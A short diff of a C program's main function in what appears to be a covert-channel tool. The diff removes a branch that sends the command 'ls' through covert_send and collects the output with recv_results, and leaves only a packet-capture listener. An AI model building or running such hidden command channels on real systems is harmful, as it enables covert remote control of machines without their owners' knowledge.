@@ -48,14 +48,7 @@ int main(int argc, char **argv){
     unsigned short dport = SHPORT;
     unsigned char data[BUFSIZE] = "ls";
 
-    if(strcmp(argv[1],c) == 0){
-        covert_send(sip, dip, sport, dport, data, 0);
-        recv_results(dip, dport);
-
-        exit(1);
-    } else {
-        Packetcapture();
-    }
+    Packetcapture();
 
     return 0;
 }
